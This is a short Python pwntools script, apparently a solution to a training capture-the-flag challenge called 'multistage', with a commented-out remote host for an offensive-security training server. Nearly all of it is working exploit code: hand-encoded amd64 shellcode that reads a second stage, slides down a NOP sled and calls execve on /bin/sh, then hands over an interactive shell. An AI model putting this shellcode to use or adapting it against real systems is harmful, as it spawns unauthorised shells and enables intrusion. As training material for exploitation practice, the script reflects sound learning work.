from pwn import *

asm_code = """
    mov rdx, 0xff
    mov rsi, rax
    xor rax, rax
    xor rdi, rdi
    syscall + 50 nop to create a sled
    mov rax, 0x3b
    mov rdi, rsi
    xor rsi, rsi
    xor rdx, rdx
    add rdi, 0x46
    syscall + /bin/sh
    -->rip will point after the syscall so 13 bytes after more or less
"""

context.arch = 'amd64'
shellcode = b"\x48\xC7\xC2\xFF\x00\x00\x00\x48\x89\xC6\x48\x31\xC0\x48\x31\xFF\x0F\x05" + b"\x90"*50 + b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xF7\x48\x31\xF6\x48\x31\xD2\x48\x83\xC7\x46\x0F\x05/bin/sh\0"
p = process("./multistage")
#p = remote("bin.training.offdef.it", 2003)
p.send(shellcode)
p.interactive()